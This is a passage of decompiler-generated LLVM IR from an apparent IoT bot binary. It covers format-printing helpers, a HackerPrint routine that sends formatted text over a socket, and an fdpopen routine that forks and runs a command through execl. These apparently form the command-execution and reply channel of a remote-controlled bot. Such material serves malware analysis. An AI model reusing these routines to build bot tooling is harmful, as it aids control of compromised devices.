  uselistorder label %dec_label_pc_87a8, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_88e0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_88e0, i32* @ip, align 4
  store i32 35052, i32* %stack_var_-4, align 4
  %v2_88e8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_88e8, i32* @fp, align 4
  %stack_var_-28.428 = inttoptr i32 %arg2 to i8*
  %v2_8c9429 = load i8, i8* %stack_var_-28.428, align 1
  %v2_8c9831 = icmp eq i8 %v2_8c9429, 0
  br i1 %v2_8c9831, label %dec_label_pc_8ca0, label %dec_label_pc_8908.lr.ph

dec_label_pc_8908.lr.ph:                          ; preds = %entry
  %v5_8c4c = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8908

dec_label_pc_8908:                                ; preds = %dec_label_pc_8908.lr.ph, %dec_label_pc_8c84
  %stack_var_-28.435 = phi i8* [ %stack_var_-28.428, %dec_label_pc_8908.lr.ph ], [ %stack_var_-28.4, %dec_label_pc_8c84 ]
  %stack_var_-28.4.in34 = phi i32 [ %arg2, %dec_label_pc_8908.lr.ph ], [ %v1_8c88, %dec_label_pc_8c84 ]
  %stack_var_-32.133 = phi i32 [ %arg3, %dec_label_pc_8908.lr.ph ], [ %stack_var_-32.0, %dec_label_pc_8c84 ]
  %stack_var_-40.132 = phi i32 [ 0, %dec_label_pc_8908.lr.ph ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_890c = load i8, i8* %stack_var_-28.435, align 1
  %v7_8910 = icmp eq i8 %v2_890c, 37
  br i1 %v7_8910, label %dec_label_pc_8918, label %dec_label_pc_8c64

dec_label_pc_8918:                                ; preds = %dec_label_pc_8908
  %v1_891c = add i32 %stack_var_-28.4.in34, 1
  %v5_8920 = inttoptr i32 %v1_891c to i8*
  %v2_8938 = load i8, i8* %v5_8920, align 1
  %v2_893c = icmp eq i8 %v2_8938, 0
  br i1 %v2_893c, label %dec_label_pc_8ca0, label %dec_label_pc_8944

dec_label_pc_8944:                                ; preds = %dec_label_pc_8918
  %v2_8948 = load i8, i8* %v5_8920, align 1
  %v7_894c = icmp eq i8 %v2_8948, 37
  br i1 %v7_894c, label %dec_label_pc_8c64, label %dec_label_pc_8954

dec_label_pc_8954:                                ; preds = %dec_label_pc_8944
  %v2_8958 = load i8, i8* %v5_8920, align 1
  %v7_895c = icmp eq i8 %v2_8958, 45
  br i1 %v7_895c, label %dec_label_pc_8964, label %dec_label_pc_8994.preheader

dec_label_pc_8964:                                ; preds = %dec_label_pc_8954
  %v1_8968 = add i32 %stack_var_-28.4.in34, 2
  %v5_896c = inttoptr i32 %v1_8968 to i8*
  br label %dec_label_pc_8994.preheader

dec_label_pc_8994.preheader:                      ; preds = %dec_label_pc_8964, %dec_label_pc_8954
  %stack_var_-28.0.ph = phi i8* [ %v5_8920, %dec_label_pc_8954 ], [ %v5_896c, %dec_label_pc_8964 ]
  %stack_var_-44.0.ph = phi i32 [ 0, %dec_label_pc_8954 ], [ 1, %dec_label_pc_8964 ]
  %v4_89942 = ptrtoint i8* %stack_var_-28.0.ph to i32
  %v2_89983 = load i8, i8* %stack_var_-28.0.ph, align 1
  %v7_899c7 = icmp eq i8 %v2_89983, 48
  br i1 %v7_899c7, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_897c:                                ; preds = %dec_label_pc_8994.preheader, %dec_label_pc_897c
  %v4_89949 = phi i32 [ %v1_8980, %dec_label_pc_897c ], [ %v4_89942, %dec_label_pc_8994.preheader ]
  %stack_var_-44.08 = phi i32 [ %v1_898c, %dec_label_pc_897c ], [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ]
  %v1_8980 = add i32 %v4_89949, 1
  %v5_8984 = inttoptr i32 %v1_8980 to i8*
  %v1_898c = or i32 %stack_var_-44.08, 2
  %v2_8998 = load i8, i8* %v5_8984, align 1
  %v7_899c = icmp eq i8 %v2_8998, 48
  br i1 %v7_899c, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_89e0.preheader:                      ; preds = %dec_label_pc_897c, %dec_label_pc_8994.preheader
  %stack_var_-44.0.lcssa = phi i32 [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ], [ %v1_898c, %dec_label_pc_897c ]
  %stack_var_-28.0.lcssa = phi i8* [ %stack_var_-28.0.ph, %dec_label_pc_8994.preheader ], [ %v5_8984, %dec_label_pc_897c ]
  %v4_89e011 = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v2_89e412 = load i8, i8* %stack_var_-28.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_89e412, 48
  br i1 %tmp60, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89a8:                                ; preds = %dec_label_pc_89f0
  %v2_89b4 = mul i32 %stack_var_-48.019, 10
  %v2_89c0 = load i8, i8* %stack_var_-28.120, align 1
  %v3_89c0 = zext i8 %v2_89c0 to i32
  %v2_89c8 = add i32 %v2_89b4, -48
  %v1_89cc = add i32 %v2_89c8, %v3_89c0
  %v1_89d8 = add i32 %v4_89e021, 1
  %v5_89dc = inttoptr i32 %v1_89d8 to i8*
  %v2_89e4 = load i8, i8* %v5_89dc, align 1
  %tmp61 = icmp ult i8 %v2_89e4, 48
  br i1 %tmp61, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89f0:                                ; preds = %dec_label_pc_89e0.preheader, %dec_label_pc_89a8
  %v4_89e021 = phi i32 [ %v1_89d8, %dec_label_pc_89a8 ], [ %v4_89e011, %dec_label_pc_89e0.preheader ]
  %stack_var_-28.120 = phi i8* [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ]
  %stack_var_-48.019 = phi i32 [ %v1_89cc, %dec_label_pc_89a8 ], [ 0, %dec_label_pc_89e0.preheader ]
  %v2_89f4 = load i8, i8* %stack_var_-28.120, align 1
  %tmp62 = icmp ult i8 %v2_89f4, 58
  br i1 %tmp62, label %dec_label_pc_89a8, label %dec_label_pc_8a00

dec_label_pc_8a00:                                ; preds = %dec_label_pc_89a8, %dec_label_pc_89f0, %dec_label_pc_89e0.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_89e0.preheader ], [ %v1_89cc, %dec_label_pc_89a8 ], [ %stack_var_-48.019, %dec_label_pc_89f0 ]
  %stack_var_-28.1.lcssa = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ], [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.120, %dec_label_pc_89f0 ]
  %v2_8a04 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a08 = icmp eq i8 %v2_8a04, 115
  br i1 %v7_8a08, label %dec_label_pc_8a10, label %dec_label_pc_8a74

dec_label_pc_8a10:                                ; preds = %dec_label_pc_8a00
  %v1_8a14 = add i32 %stack_var_-32.133, 4
  %v1_8a20 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a20 = load i32, i32* %v1_8a20, align 4
  %v2_8a2c = icmp eq i32 %v2_8a20, 0
  br i1 %v2_8a2c, label %dec_label_pc_8a40, label %dec_label_pc_8a34

dec_label_pc_8a34:                                ; preds = %dec_label_pc_8a10
  %v5_8a38 = inttoptr i32 %v2_8a20 to i8*
  br label %dec_label_pc_8a48

dec_label_pc_8a40:                                ; preds = %dec_label_pc_8a10
  br label %dec_label_pc_8a48

dec_label_pc_8a48:                                ; preds = %dec_label_pc_8a34, %dec_label_pc_8a40
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ce04.36, i32 0, i32 0), %dec_label_pc_8a40 ], [ %v5_8a38, %dec_label_pc_8a34 ]
  %v7_8a5c = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8a68 = add i32 %v7_8a5c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8a74:                                ; preds = %dec_label_pc_8a00
  %v2_8a78 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a7c = icmp eq i8 %v2_8a78, 100
  br i1 %v7_8a7c, label %dec_label_pc_8a84, label %dec_label_pc_8ad8

dec_label_pc_8a84:                                ; preds = %dec_label_pc_8a74
  %v1_8a88 = add i32 %stack_var_-32.133, 4
  %v1_8a94 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a94 = load i32, i32* %v1_8a94, align 4
  %v7_8ac0 = call i32 @printi(i32 %tmp, i32 %v2_8a94, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8acc = add i32 %v7_8ac0, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ad8:                                ; preds = %dec_label_pc_8a74
  %v2_8adc = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ae0 = icmp eq i8 %v2_8adc, 120
  br i1 %v7_8ae0, label %dec_label_pc_8ae8, label %dec_label_pc_8b3c

dec_label_pc_8ae8:                                ; preds = %dec_label_pc_8ad8
  %v1_8aec = add i32 %stack_var_-32.133, 4
  %v1_8af8 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8af8 = load i32, i32* %v1_8af8, align 4
  %v7_8b24 = call i32 @printi(i32 %tmp, i32 %v2_8af8, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8b30 = add i32 %v7_8b24, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8b3c:                                ; preds = %dec_label_pc_8ad8
  %v2_8b40 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8b44 = icmp eq i8 %v2_8b40, 88
  br i1 %v7_8b44, label %dec_label_pc_8b4c, label %dec_label_pc_8ba0

dec_label_pc_8b4c:                                ; preds = %dec_label_pc_8b3c
  %v1_8b50 = add i32 %stack_var_-32.133, 4
  %v1_8b5c = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8b5c = load i32, i32* %v1_8b5c, align 4
  %v7_8b88 = call i32 @printi(i32 %tmp, i32 %v2_8b5c, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 65)
  %v2_8b94 = add i32 %v7_8b88, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ba0:                                ; preds = %dec_label_pc_8b3c
  %v2_8ba4 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ba8 = icmp eq i8 %v2_8ba4, 117
  br i1 %v7_8ba8, label %dec_label_pc_8bb0, label %dec_label_pc_8c04

dec_label_pc_8bb0:                                ; preds = %dec_label_pc_8ba0
  %v1_8bb4 = add i32 %stack_var_-32.133, 4
  %v1_8bc0 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8bc0 = load i32, i32* %v1_8bc0, align 4
  %v7_8bec = call i32 @printi(i32 %tmp, i32 %v2_8bc0, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8bf8 = add i32 %v7_8bec, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c04:                                ; preds = %dec_label_pc_8ba0
  %v2_8c08 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8c0c = icmp eq i8 %v2_8c08, 99
  br i1 %v7_8c0c, label %dec_label_pc_8c14, label %dec_label_pc_8c84

dec_label_pc_8c14:                                ; preds = %dec_label_pc_8c04
  %v1_8c18 = add i32 %stack_var_-32.133, 4
  %v1_8c24 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8c24 = load i32, i32* %v1_8c24, align 4
  %v1_8c28 = urem i32 %v2_8c24, 256
  store i32 %v1_8c28, i32* %stack_var_-18, align 4
  %v6_8c4c = call i32 @prints(i32 %tmp, i8* %v5_8c4c, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 %v1_8c18)
  %v2_8c58 = add i32 %v6_8c4c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c64:                                ; preds = %dec_label_pc_8908, %dec_label_pc_8944
  %stack_var_-28.2 = phi i8* [ %v5_8920, %dec_label_pc_8944 ], [ %stack_var_-28.435, %dec_label_pc_8908 ]
  %v2_8c68 = load i8, i8* %stack_var_-28.2, align 1
  %v3_8c68 = zext i8 %v2_8c68 to i32
  %v3_8c74 = call i32 @printchar(i32* %arg1, i32 %v3_8c68)
  %v1_8c7c = add i32 %stack_var_-40.132, 1
  br label %dec_label_pc_8c84

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c04, %dec_label_pc_8c14, %dec_label_pc_8bb0, %dec_label_pc_8b4c, %dec_label_pc_8ae8, %dec_label_pc_8a84, %dec_label_pc_8a48, %dec_label_pc_8c64
  %stack_var_-40.0 = phi i32 [ %v1_8c7c, %dec_label_pc_8c64 ], [ %v2_8a68, %dec_label_pc_8a48 ], [ %v2_8acc, %dec_label_pc_8a84 ], [ %v2_8b30, %dec_label_pc_8ae8 ], [ %v2_8b94, %dec_label_pc_8b4c ], [ %v2_8bf8, %dec_label_pc_8bb0 ], [ %v2_8c58, %dec_label_pc_8c14 ], [ %stack_var_-40.132, %dec_label_pc_8c04 ]
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.133, %dec_label_pc_8c64 ], [ %v1_8a14, %dec_label_pc_8a48 ], [ %v1_8a88, %dec_label_pc_8a84 ], [ %v1_8aec, %dec_label_pc_8ae8 ], [ %v1_8b50, %dec_label_pc_8b4c ], [ %v1_8bb4, %dec_label_pc_8bb0 ], [ %v1_8c18, %dec_label_pc_8c14 ], [ %stack_var_-32.133, %dec_label_pc_8c04 ]
  %stack_var_-28.3 = phi i8* [ %stack_var_-28.2, %dec_label_pc_8c64 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a48 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a84 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8ae8 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8b4c ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8bb0 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c14 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c04 ]
  %v4_8c84 = ptrtoint i8* %stack_var_-28.3 to i32
  %v1_8c88 = add i32 %v4_8c84, 1
  %stack_var_-28.4 = inttoptr i32 %v1_8c88 to i8*
  %v2_8c94 = load i8, i8* %stack_var_-28.4, align 1
  %v2_8c98 = icmp eq i8 %v2_8c94, 0
  br i1 %v2_8c98, label %dec_label_pc_8ca0, label %dec_label_pc_8908

dec_label_pc_8ca0:                                ; preds = %dec_label_pc_8918, %dec_label_pc_8c84, %entry
  %stack_var_-40.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-40.132, %dec_label_pc_8918 ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_8ca4 = icmp eq i32* %arg1, null
  br i1 %v2_8ca4, label %dec_label_pc_8cbc, label %dec_label_pc_8cac

dec_label_pc_8cac:                                ; preds = %dec_label_pc_8ca0
  %v2_8cb0 = load i32, i32* %arg1, align 4
  %v3_8cb8 = inttoptr i32 %v2_8cb0 to i8*
  store i8 0, i8* %v3_8cb8, align 1
  br label %dec_label_pc_8cbc

dec_label_pc_8cbc:                                ; preds = %dec_label_pc_8ca0, %dec_label_pc_8cac
  ret i32 %stack_var_-40.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-28.4, { 1, 0 }
  uselistorder i8* %stack_var_-28.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-28.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-44.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8980, { 1, 0 }
  uselistorder i32 %stack_var_-44.0.ph, { 1, 0 }
  uselistorder i8* %v5_8920, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-40.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-32.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-28.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8cbc, { 1, 0 }
  uselistorder label %dec_label_pc_8ca0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8c84, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8c64, { 1, 0 }
  uselistorder label %dec_label_pc_8a48, { 1, 0 }
  uselistorder label %dec_label_pc_8a00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_89f0, { 1, 0 }
  uselistorder label %dec_label_pc_897c, { 1, 0 }
  uselistorder label %dec_label_pc_8908, { 1, 0 }
}

define i32 @zprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-12, align 4
  store i32 36064, i32* %stack_var_-20, align 4
  %v2_8cdc = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8cdc, i32* @fp, align 4
  %v2_8ce4 = ptrtoint i32* %stack_var_-12 to i32
  %v4_8cfc = call i32 @print(i32* null, i32 %arg1, i32 %v2_8ce4)
  ret i32 %v4_8cfc

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d18 = load i32, i32* @fp, align 4
  store i32 36128, i32* %stack_var_-16, align 4
  %v2_8d1c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d1c, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8d28 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8d40 = call i32 @print(i32* nonnull %stack_var_-36, i32 %arg2, i32 %v2_8d28)
  store i32 %v3_8d18, i32* @fp, align 4
  ret i32 %v4_8d40

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @HackerPrint(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_8d58 = load i32, i32* @r2, align 4
  store i32 %v6_8d58, i32* %stack_var_-8, align 4
  %v3_8d5c = load i32, i32* @fp, align 4
  store i32 36196, i32* %stack_var_-16, align 4
  %v2_8d60 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d60, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-48, align 4
  %v1_8d70 = call i32 @malloc(i32 2048)
  store i32 %v1_8d70, i32* %stack_var_-40, align 4
  store i32 2048, i32* @r2, align 4
  %v2_8d8c = inttoptr i32 %v1_8d70 to i8*
  %v3_8d8c = call i32 @__GI_memset(i8* %v2_8d8c, i32 0)
  %v2_8d98 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8db8 = call i32 @print(i32* nonnull %stack_var_-40, i32 %arg2, i32 %v2_8d98)
  %v3_8dc0 = call i32 @strlen(i8* %v2_8d8c)
  %v2_8dd0 = add i32 %v3_8dc0, %v1_8d70
  %v3_8dd8 = inttoptr i32 %v2_8dd0 to i8*
  store i8 10, i8* %v3_8dd8, align 1
  %v3_8de0 = call i32 @strlen(i8* %v2_8d8c)
  %v3_8de8 = load i32, i32* %stack_var_-48, align 4
  %v4_8df8 = inttoptr i32 %v1_8d70 to i32*
  %v5_8df8 = call i32 @__libc_send(i32 %v3_8de8, i32* %v4_8df8, i32 %v3_8de0, i32 16384)
  %v1_8e08 = call i32 @free(i32 %v1_8d70)
  store i32 %v3_8d5c, i32* @fp, align 4
  ret i32 %v5_8df8

; uselistorder directives
  uselistorder i8* %v2_8d8c, { 1, 0, 2 }
  uselistorder i32 %v1_8d70, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8e20 = load i32, i32* @fp, align 4
  store i32 36392, i32* %stack_var_-4, align 4
  %v2_8e24 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e24, i32* @fp, align 4
  %v2_8e38 = load i8, i8* %arg2, align 1
  %v7_8e3c = icmp eq i8 %v2_8e38, 114
  br i1 %v7_8e3c, label %dec_label_pc_8e54, label %dec_label_pc_8e44

dec_label_pc_8e44:                                ; preds = %entry
  %v2_8e48 = load i8, i8* %arg2, align 1
  %v7_8e4c = icmp eq i8 %v2_8e48, 119
  br i1 %v7_8e4c, label %dec_label_pc_8e54, label %dec_label_pc_8e68

dec_label_pc_8e54:                                ; preds = %dec_label_pc_8e44, %entry
  %v1_8e58 = add i32 %tmp, 1
  %v1_8e5c = inttoptr i32 %v1_8e58 to i8*
  %v2_8e5c = load i8, i8* %v1_8e5c, align 1
  %v2_8e60 = icmp eq i8 %v2_8e5c, 0
  br i1 %v2_8e60, label %dec_label_pc_8e74, label %dec_label_pc_8e68

dec_label_pc_8e68:                                ; preds = %dec_label_pc_8e44, %dec_label_pc_8e54
  br label %dec_label_pc_9084

dec_label_pc_8e74:                                ; preds = %dec_label_pc_8e54
  %v2_8e74 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8e7c = call i32 @__GI_pipe(i32 %v2_8e74)
  %v1_8e84 = icmp slt i32 %v1_8e7c, 0
  br i1 %v1_8e84, label %dec_label_pc_8e8c, label %dec_label_pc_8e98

dec_label_pc_8e8c:                                ; preds = %dec_label_pc_8e74
  br label %dec_label_pc_9084

dec_label_pc_8e98:                                ; preds = %dec_label_pc_8e74
  %v2_8e9c = load i32, i32* @global_var_2f5e8.38, align 4
  %v2_8ea0 = icmp eq i32 %v2_8e9c, 0
  br i1 %v2_8ea0, label %dec_label_pc_8ea8, label %dec_label_pc_8f2c

dec_label_pc_8ea8:                                ; preds = %dec_label_pc_8e98
  %v0_8ea8 = call i32 @getdtablesize()
  %v5_8ebc = icmp sgt i32 %v0_8ea8, 0
  br i1 %v5_8ebc, label %dec_label_pc_8ecc, label %dec_label_pc_8ec0

dec_label_pc_8ec0:                                ; preds = %dec_label_pc_8ea8
  br label %dec_label_pc_9084

dec_label_pc_8ecc:                                ; preds = %dec_label_pc_8ea8
  %v3_8ed0 = mul i32 %v0_8ea8, 4
  %v1_8ed8 = call i32 @malloc(i32 %v3_8ed0)
  store i32 %v1_8ed8, i32* @global_var_2f5e8.38, align 4
  %v2_8ef4 = icmp eq i32 %v1_8ed8, 0
  br i1 %v2_8ef4, label %dec_label_pc_8efc, label %dec_label_pc_8f08

dec_label_pc_8efc:                                ; preds = %dec_label_pc_8ecc
  br label %dec_label_pc_9084

dec_label_pc_8f08:                                ; preds = %dec_label_pc_8ecc
  store i32 %v3_8ed0, i32* @r2, align 4
  %v2_8f28 = inttoptr i32 %v1_8ed8 to i8*
  %v3_8f28 = call i32 @__GI_memset(i8* %v2_8f28, i32 0)
  br label %dec_label_pc_8f2c

dec_label_pc_8f2c:                                ; preds = %dec_label_pc_8e98, %dec_label_pc_8f08
  %v0_8f2c = call i32 @__vfork()
  %v7_8f44 = icmp eq i32 %v0_8f2c, -1
  br i1 %v7_8f44, label %dec_label_pc_8f5c, label %dec_label_pc_8f4c

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f2c
  %v2_8f50 = icmp eq i32 %v0_8f2c, 0
  %v2_8f84 = load i8, i8* %arg2, align 1
  %v7_8f88 = icmp eq i8 %v2_8f84, 114
  br i1 %v2_8f50, label %dec_label_pc_8f80, label %dec_label_pc_9020

dec_label_pc_8f5c:                                ; preds = %dec_label_pc_8f2c
  %v3_8f5c = load i32, i32* %stack_var_-32, align 4
  %v1_8f64 = call i32 @__libc_close(i32 %v3_8f5c)
  %v1_8f70 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_9084

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f4c
  br i1 %v7_8f88, label %dec_label_pc_8f90, label %dec_label_pc_8fc8

dec_label_pc_8f90:                                ; preds = %dec_label_pc_8f80
  %v7_8f94 = icmp eq i32 %tmp3, 1
  br i1 %v7_8f94, label %dec_label_pc_8fb8, label %dec_label_pc_8f9c

dec_label_pc_8f9c:                                ; preds = %dec_label_pc_8f90
  %v0_8fa8 = call i32 @dup2()
  %v1_8fb4 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_8fb8

dec_label_pc_8fb8:                                ; preds = %dec_label_pc_8f90, %dec_label_pc_8f9c
  %v3_8fb8 = load i32, i32* %stack_var_-32, align 4
  %v1_8fc0 = call i32 @__libc_close(i32 %v3_8fb8)
  br label %dec_label_pc_8ffc

dec_label_pc_8fc8:                                ; preds = %dec_label_pc_8f80
  %v3_8fc8 = load i32, i32* %stack_var_-32, align 4
  %v2_8fcc = icmp eq i32 %v3_8fc8, 0
  br i1 %v2_8fcc, label %dec_label_pc_8ff0, label %dec_label_pc_8fd4

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_8fc8
  %v0_8fe0 = call i32 @dup2()
  %v3_8fe4 = load i32, i32* %stack_var_-32, align 4
  %v1_8fec = call i32 @__libc_close(i32 %v3_8fe4)
  br label %dec_label_pc_8ff0

dec_label_pc_8ff0:                                ; preds = %dec_label_pc_8fc8, %dec_label_pc_8fd4
  %v1_8ff8 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_8ffc

dec_label_pc_8ffc:                                ; preds = %dec_label_pc_8fb8, %dec_label_pc_8ff0
  store i32 ptrtoint ([8 x i8]* @global_var_1ce0c.40 to i32), i32* @r0, align 4
  %v8_9014 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1ce0c.40 to i32), i32 ptrtoint ([3 x i8]* @global_var_1ce14.42 to i32), i32 ptrtoint ([3 x i8]* @global_var_1ce18.44 to i32), i32 %arg1, i32 0)
  %v1_901c = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_9020:                                ; preds = %dec_label_pc_8f4c
  br i1 %v7_8f88, label %dec_label_pc_9030, label %dec_label_pc_9048

dec_label_pc_9030:                                ; preds = %dec_label_pc_9020
  %v3_9030 = load i32, i32* %stack_var_-32, align 4
  %v1_9040 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_905c

dec_label_pc_9048:                                ; preds = %dec_label_pc_9020
  %v3_9050 = load i32, i32* %stack_var_-32, align 4
  %v1_9058 = call i32 @__libc_close(i32 %v3_9050)
  br label %dec_label_pc_905c

dec_label_pc_905c:                                ; preds = %dec_label_pc_9030, %dec_label_pc_9048
  %stack_var_-40.0 = phi i32 [ %v3_9030, %dec_label_pc_9030 ], [ %tmp3, %dec_label_pc_9048 ]
  %v3_9060 = mul i32 %stack_var_-40.0, 4
  %v2_906c = load i32, i32* @global_var_2f5e8.38, align 4
  %v2_9070 = add i32 %v2_906c, %v3_9060
  %v2_9078 = inttoptr i32 %v2_9070 to i32*
  store i32 %v0_8f2c, i32* %v2_9078, align 4
  br label %dec_label_pc_9084

dec_label_pc_9084:                                ; preds = %dec_label_pc_8f5c, %dec_label_pc_8efc, %dec_label_pc_8ec0, %dec_label_pc_8e8c, %dec_label_pc_8e68, %dec_label_pc_905c
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8e8c ], [ -1, %dec_label_pc_8efc ], [ -1, %dec_label_pc_8f5c ], [ %stack_var_-40.0, %dec_label_pc_905c ], [ -1, %dec_label_pc_8ec0 ], [ -1, %dec_label_pc_8e68 ]
  store i32 %v3_8e20, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8f2c, { 1, 2, 0 }
  uselistorder i32 %v3_8ed0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 5, 4, 3, 2, 1 }
  uselistorder i8* %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9084, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_905c, { 1, 0 }
